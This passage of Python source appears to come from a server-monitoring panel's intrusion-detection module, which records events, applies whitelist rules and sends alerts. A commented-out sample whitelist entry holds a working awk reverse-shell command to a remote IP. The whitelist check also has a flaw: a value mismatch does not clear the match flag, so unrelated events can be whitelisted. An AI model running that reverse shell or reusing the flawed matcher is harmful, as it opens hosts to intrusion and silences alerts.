            return (None, BtMonitorException('执行脚本中包含敏感命令：{}'.format(shell)))

        return self.send_message_to_agent(sid, 'exec_shell/GetShellExecResult', {'command': shell}, 300)

    def get_agent_version_with_sid(self, sid):
        """
            @name 获取Agent版本号
            @author Zhj<2023-05-24>
            @param  sid<int> 主机ID
            @return string
        """
        return public.readFile('{}/data/monitor_servers/{}/agentversion.pl'.format(public.get_panel_path(), public.md5(str(sid)))) or '1.0'


    # 更新主机入侵检测列表
    def update_server_hids(self, sid, hids):
        '''
            @nmae 更新主机入侵检测列表
            @author lt<2023-06-13>
            @param  sid<int>        主机ID
            @param  hids<list>  入侵检测列表
            @return bool
        '''

        # if isinstance(hids, str):
        #     try:
        #         hids = json.loads(hids)
        #     except:
        #         public.print_log('退出1111111--{}'.format(hids), _level='error')
        #         return False
        #
        # if not isinstance(hids, dict) or len(hids) < 1:
        #     public.print_log('退出222222222'.format(), _level='error')
        #     return False
        # if all(value is None for value in hids.values()):
        #     public.print_log('sid--{}退出3333333--{}'.format(sid, hids), _level='error')
        #     return False
        # public.print_log('入侵扫描 进入存储方法'.format(), _level='error')

        hids_list = []
        for key in hids:
            if hids[key]:
                hids_list.extend([{**event} for event in hids[key]])

        # 计算各规则类型对应数量  {'规则编号':数量, ...}
        dataType_count = {}
        for key, value in hids.items():
            key_ = key.split('_')[1]
            if value is not None:
                dataType_count[key_] = len(value)

        # public.print_log('入侵扫描 处理原始数据{}'.format(hids_list), _level='error')

        insert_data = []

        cur_time = int(time.time())
        # 0: 低危 1: 中危 2: 高危 3: 危险
        level_map = {'medium': 1, 'high': 2,}
        titles = {'pid_tree': '进程树', 'username': '用户名', 'dip': '目标IP', 'sport': '监听端口', 'ssh': '外联ssh登录信息',
                  'socket_argv': '外联进程命令行', 'run_path': '执行目录', 'stdin': '进程输入', 'stdout': '进程输出'}

        with monitor_db_manager.db_mgr('hids') as db:

            # 告警数据
            warning_info = db.query() \
                .name('hids_warning') \
                .where('sid', sid) \
                .find()

        # 查找上次入侵检测告警次数
        warning_count = warning_info['warning_count'] if warning_info else 0

        for item in hids_list:
            # 处理other字段
            other = item.get('other', {})
            # public.print_log('入侵扫描 99要处理的other {}'.format(other), _level='error')
            if isinstance(other, str):
                try:
                    other = json.loads(other)
                except:
                    pass

            if not isinstance(other, dict) or len(other) < 1:
                other = {}

            other.update({'pid_tree': item.get('pid_tree', ''), 'username': item.get('username', '')})
            # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
            # 用来判断是否白名单的数据
            test_white = {'exe': item['exe'],
                          'pid': item['pid'],
                          'argv': item['argv'],
                          'data_type': item['data_type'],
                          }

            test_white.update(other)
            # 判断是否白名单
            # public.print_log('白名单 ---222222222  {}'.format(white_lists), _level='error')
            # public.print_log('主机入侵 获取类型  ---222222222  {}'.format(test_white), _level='error')

            with monitor_db_manager.db_mgr('hids') as db:
                # 白名单数据
                white_lists = db.query() \
                    .name('hids_white_list') \
                    .where('type', int(item['data_type'])) \
                    .select()

            # white_list = list(white_lists.get(int(test_white['data_type']), []))

            if not white_lists:  # 没有白名单
                is_white = False
                # public.print_log('没有白名单 ---退出222222222'.format(), _level='error')
            else:
                is_white = self.check_hids_white_one(white_lists, test_white)

            # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
            # 累计告警次数
            if not is_white:
                # 需要累计告警次数
                warning_count += 1
            else:
                # public.print_log('属于白名单 ---33333333333'.format(), _level='error')
                # 属于白名单 规则类型dataType_count统计数量-1
                dataType_count[test_white['data_type']] -= 1

            others = [{"key": key, "value": other[key], "title": titles[key]} for key in other]

            insert = {
                'sid': sid,
                'status': 0,  # 0: 未处理
                'white': int(is_white),  # 白名单id  0: 不是白名单
                'handle_operator': 0,
                'handled_time': 0,

                'create_time': item.get('time', cur_time),
                'level': level_map.get(item['level'], 0),
                'data_type': int(item['data_type']),
                'type': item['type'],
                'vulnname': item['vulnname'],
                'msg': item['msg'],
                'suggestions': item['repair'],
                'exe': item['exe'],
                'pid': item['pid'],
                'argv': item['argv'],

                'other': json.dumps(others, ensure_ascii=False),  # 其他信息
            }
            insert_data.append(insert)
        # public.print_log('入侵扫描 准备添加|||||||||||||||||||||{}'.format(insert_data), _level='error')

        with monitor_db_manager.db_mgr('hids') as db:
            db.query().name('hids_list').insert_all(insert_data)
        # public.print_log('入侵扫描 ---判断是否需要告警'.format(), _level='error')
        self.check_hids_warning(warning_info, warning_count, sid, dataType_count)
        # public.print_log('结束'.format(), _level='error')
        # public.print_log('入侵扫描 333'.format(insert_data), _level='error')

        return True


    # def check_hids_white_list(self, id_list ):
    #     '''
    #         @nmae 判断白名单
    #         @author lt<2023-06-14>
    #         @param  id_list<list>    新添加的入侵事件id
    #         @return dict        返回需要告警的入侵事件 去累计
    #     '''
    #
    #     with monitor_db_manager.db_mgr('hids') as db:
    #         # # 根据规则类型区分
    #         # white_list = db.query() \
    #         #     .name('hids_white_list') \
    #         #     .column(None, 'type')
    #
    #         white_list = db.query() \
    #             .name('hids_white_list') \
    #             .select()
    #
    #         hids_list = db.query() \
    #             .name('hids_list') \
    #             .where_in('id', id_list) \
    #             .field('id', 'exe', 'data_type', 'pid', 'argv', 'other') \
    #             .select()
    #
    #     # 将所有的详情转换为字典
    #     hids = []
    #     for i in hids_list:
    #         # 将所有的规则转换为字典
    #         other = json.loads(i['other'])
    #         # 数据转成普通字典
    #         hids_dict = {item['key']: item['value'] for item in other}
    #         a = {
    #             'id': i['id'],
    #             'exe': i['exe'],
    #             'data_type': i['data_type'],
    #             'pid': i['pid'],
    #             'argv': i['argv'],
    #         }
    #         hids_dict.update(a)
    #         hids.append(hids_dict)
    #
    #     # 将所有的白名单规则转换为字典
    #     white_list = []
    #     for w in white_list:
    #         match_detail = json.loads(w['match_detail'])
    #         # 数据转成普通字典
    #         match_detail_dict = {item['key']: item['value'] for item in match_detail}
    #         match_detail_dict.update({'id': w['id']})
    #         white_list.append(match_detail_dict)
    #
    #     wid_hid = {}
    #     for item in white_list:
    #         wid_hid[item['id']] = []  # 用白名单的id作为key
    #         for i, d in enumerate(hids):
    #             if 'id' in d:
    #                 if all(k in d and d[k] == item[k] for k in item if k != 'id'):
    #                     wid_hid[item['id']].append(d['id'])
    #     wid_hid = {k: v for k, v in wid_hid.items() if len(v) > 0}
    #
    #
    #     with monitor_db_manager.db_mgr('hids') as db:
    #         # 开启事务
    #         db.autocommit(False)
    #
    #         for wid, hid in wid_hid.items():
    #             # 更新白名单标记
    #             db.query() \
    #                 .name('hids_list') \
    #                 .where_in('id', hid) \
    #                 .update({'white': wid})
    #         db.commit()
    #
    #     # 返回不属于白名单的id
    #
    #     is_whites_id = sum(wid_hid.values(), [])
    #     not_whites_id = [i for i in id_list if i not in is_whites_id]
    #     return not_whites_id


    def check_hids_white_one(self, white_list, hids_data):
        '''
            @nmae 判断当前入侵信息是否在白名单
            @author lt<2023-06-14>
            @param  white_list<list>   白名单规则
            @param  hids_data<dict>    入侵信息 一条
            @return int/bool       返回白名单id 或者 False
        '''
        # public.print_log('白名单 white_list 0000--{}'.format(white_list), _level='error')
        # public.print_log('白名单 white_list 0011--{}'.format(type(white_list)), _level='error')

        # white_lists = [{'id': 30, 'type': 42, 'creator': 1, 'create_time': 1687663150, 'match_type': 1,
        #                'vulnname': 'awk反弹shell检测', 'ps': '恶意',
        #                'match_detail': '[{"key": "exe", "value": "/usr/bin/gawk", "title": "进程二进制文件"}, {"key": "argv", "value": "awk BEGIN{s=/inet/tcp/0/192.168.1.182/5566;for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}", "title": "进程命令行"}, {"key": "pid_tree", "value": "-3", "title": "进程树"}, {"key": "username", "value": "root", "title": "用户名"}]'},
        #               {'id': 31, 'type': 42, 'creator': 1, 'create_time': 1687663206, 'match_type': 1,
        #                'vulnname': 'awk反弹shell检测', 'ps': '恶意',
        #                'match_detail': '[{"key": "exe", "value": "/usr/bin/gawk", "title": "进程二进制文件"}, {"key": "pid_tree", "value": "-3", "title": "进程树"}, {"key": "username", "value": "root", "title": "用户名"}]'}]

        # 将所有的白名单规则转换为字典
        white_lists = []
        for w in white_list:
            match_detail = json.loads(w['match_detail'])
            # 数据转成普通字典
            match_detail_dict = {item['key']: item['value'] for item in match_detail}
            match_detail_dict.update({'id': w['id']})
            white_lists.append(match_detail_dict)

        # hids_data = {'a': 1, 'c': 3, 'j': 2, 'b': 2, }
        # white_list = [{'a': 1, 'c': 3, 'id': 100}, {'g': 1, 'q': 2, 'id': 200}]
        # public.print_log('入侵单条 hids_data 4444--{}'.format(hids_data), _level='error')
        # public.print_log('用来匹配的白名单 white_lists 55555--{}'.format(white_lists), _level='error')

        for item in white_lists:
            if 'id' in item:
                match = True
                for k, v in item.items():
                    if k != 'id' and k not in hids_data:  # 如果白名单的key不在入侵信息中 (id除外)
                        match = False
                        break
                    if k != 'id' and hids_data.get(k) != v:  # 如果白名单的key在入侵信息中 但是值不相等 (id除外)
                        break
                if match:
                    return item['id']
        return False

    # 判断是否需要告警
    def check_hids_warning(self, warning_info, warning_count, sid, dataType_count):
        '''
            @nmae 判断是否需要告警 并且更新告警次数
            @param  warning_info<dict>   告警配置
            @param  warning_count<int>   告警累计的次数
            @param  sid<int>            sid
            @param  dataType_count<dict> 各规则类型的对应数量   {'601':3, '57':2, '49':1}
            @return bool
        '''

        # 查找告警次数是否超过阈值 超过则告警 并且更新告警次数
        if not warning_info:  # 没有告警配置
            # public.print_log('000--没有告警配置'.format(), _level='error')
            return False

        if not warning_info['open']:  # 告警关闭
            # public.print_log('111--告警关闭'.format(), _level='error')
            return False
        warning_num = warning_info['count']  # 告警阈值
        if warning_count < warning_num:
            # public.print_log('222--阈值不匹配 warning_count{}< warning_num{}'.format(warning_count, warning_num), _level='error')
            # 更新告警次数
            with monitor_db_manager.db_mgr('hids') as db:
                db.query() \
                    .name('hids_warning') \
                    .where('sid', sid) \
                    .update({'warning_count': warning_count}, blocking=False)
            return False

        # public.print_log('入侵扫描 满足告警'.format(), _level='error')

        # 查询模版id
        conf_id = self.db_easy('warning_configurations') \
            .where('add_source', 2) \
            .value('max(`id`)')

        # public.print_log('77777777777'.format(), _level='error')

        if not conf_id:
            # 没有告警模版 创建一个
            rule_data = {
                    "title": '入侵检测告警',
                    "add_source": 2,
                    "content": '入侵检测告警',
                }

            conf_id = self.db_easy('warning_configurations').insert(rule_data)
        # public.print_log('888888888'.format(), _level='error')

        # 1.直接推送告警消息
        # 获取推送方式
        from core.include.monitor_helpers import warning_obj

        possible_push_methods = warning_obj.get_push_methods().keys()
        times = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(time.time()))
        server = self.db_easy('servers').where('sid', sid).find()
        ip = server['ip']
        remark = server['remark']
        # 告警规则类型 数量  带外攻击-601 提权攻击-611 代码执行-59 恶意连接-42
        titles = {'601': '带外攻击', '611': '提权攻击', '59': '代码执行', '42': '恶意连接'}
        dataType_count = {titles[k]: v for k, v in dataType_count.items()}


        data_d = ''
        for i, j in dataType_count.items():
            a = "【{}】恶意执行【{}】次  ".format(i, j)
            data_d += a

        notify_content = '入侵告警：检查到{}'.format(data_d)

        # public.print_log('444告警信息--notify_content {}'.format(notify_content), _level='error')
        # notify_content = f'入侵检测告警，已超过告警阈值 {warning_num}次，入侵类型及数量：{dataType_count}'

        mail_title = {'mail_title': "{}{} 入侵检测告警 已达到告警数量 {}次".format(ip, remark, warning_count)}

        send_msg = [
            f'> 告警类型：入侵检测告警',
            f'> 推送时间: {times}',
            f'> 主机: {ip} ({remark})',
            f'> 告警消息：{notify_content}',
            '',
            '堡塔云安全监控告警提醒，请尽快处理',
        ]
        warning_obj.push_message(send_msg, push_methods=possible_push_methods,options=mail_title)

        # public.print_log('入侵扫描 推送告警'.format(), _level='error')

        # warning_obj.push_message(send_msg, push_methods=str(temp['push_methods']).split(','))

        # 2.写入一条告警日志 conf_id 数据库warning_task
        self.db_easy('warning_tasks').insert({
            'sid': sid,
            'conf_id': conf_id,
            'title': notify_content,  # 规则类型+数量
            'is_pushed': 1,
            'content': notify_content,
            'create_time': int(time.time()),
        }, blocking=False)

        # 次数清零 告警配置表清零
        with monitor_db_manager.db_mgr('hids') as db:
            db.query() \
                .name('hids_warning') \
                .where('sid', sid) \
                .update({'warning_count': 0}, blocking=False)

        return True

    # 计算每分钟的平均值
    def get_average_minute(self, data, key):
        '''
            @name 计算每分钟的平均值 保留两位小数
            @param data<list> 数据列表(原始数据)
            @param key<str> 需要计算的字段
            @return float
        '''
        from collections import defaultdict

        # 以time_slot 为键，将元素放入对应的列表中
        time_slot_dict = defaultdict(list)
        for item in data:
            time_slot_dict[item['time_slot']].append(item)

        # 计算每个 time_slot 对应的 percent 的均值，构建新的列表
        new_list = []
        for time_slot, data_list in time_slot_dict.items():
            percent_list = [item[key] for item in data_list]
            percent_avg = int((sum(percent_list) / len(percent_list)) * 100) / 100
            new_item = data_list[0].copy()
            new_item[key] = percent_avg
            new_list.append(new_item)

        return new_list




    # 计算两次均值
    def get_average(self, data):
        '''
            @name 计算两次均值
            @param data<list>  数据列表(只有值)
            @return float
        '''
        if sum(data) > 0:
            avg1 = int((sum(data)/len(data))*100)/100
            values_above_avg1 = [v for v in data if v >= avg1]
            if len(values_above_avg1) > 0:
                avg2 = sum(values_above_avg1) / len(values_above_avg1)
            else:
                avg2 = 0
        else:
            avg2 = 0
        return avg2
